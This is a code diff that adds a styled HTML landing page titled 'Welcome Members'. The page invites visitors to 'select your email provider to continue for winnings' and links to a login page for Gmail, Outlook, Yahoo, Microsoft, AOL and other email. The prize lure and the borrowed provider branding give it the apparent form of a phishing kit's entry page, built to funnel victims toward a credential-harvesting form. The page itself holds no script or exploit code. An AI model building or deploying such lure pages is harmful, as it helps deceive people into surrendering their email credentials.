@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Welcome Members</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #4facfe, #a64af8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .card {
+        background: white;
+        border-radius: 16px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        padding: 2rem;
+        width: 350px;
+        text-align: center;
+      }
+      .card h1 {
+        background: linear-gradient(90deg, #4facfe, #a64af8);
+        -webkit-background-clip: text;
+        background-clip: text;
+        -webkit-text-fill-color: transparent;
+        font-size: 1.8rem;
+        margin-bottom: 0.5rem;
+      }
+      .providers {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 1rem;
+        margin-top: 1.5rem;
+      }
+      button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        padding: 0.8rem;
+        font-size: 1rem;
+        background: #f9f9f9;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: background 0.3s;
+      }
+      button:hover {
+        background: #eee;
+      }
+      img.icon {
+        width: 20px;
+        height: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Welcome Members!!</h1>
+      <p>Select your email provider to continue for winnings</p>
+      <div class="providers">
+        <a href="login.html?provider=Gmail" class="provider-btn">
+          <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Gmail" />
+          Gmail
+        </a>
+        <a href="login.html?provider=Outlook" class="provider-btn">
+          <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg" alt="Outlook" />
+          Outlook
+        </a>
+        <a href="login.html?provider=Yahoo%20Mail" class="provider-btn">
+          <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/2/24/Yahoo%21_logo.svg" alt="Yahoo" />
+          Yahoo Mail
+        </a>
+        <a href="login.html?provider=Microsoft" class="provider-btn">
+          <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" />
+          Microsoft
+        </a>
+        <a href="login.html?provider=Aol" class="provider-btn">
+          <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/7/7e/AOL_logo.svg" alt="Aol" />
+          Aol
+        </a>
+        <a href="login.html?provider=Other%20Email" class="provider-btn">
+          <img class="icon" src="https://upload.wikimedia.org/wikipedia/commons/3/3b/Envelope_icon.svg" alt="Other Email" />
+          Other Email
+        </a>
+
+      </div>
+    </div>
+  </body>
+</html>
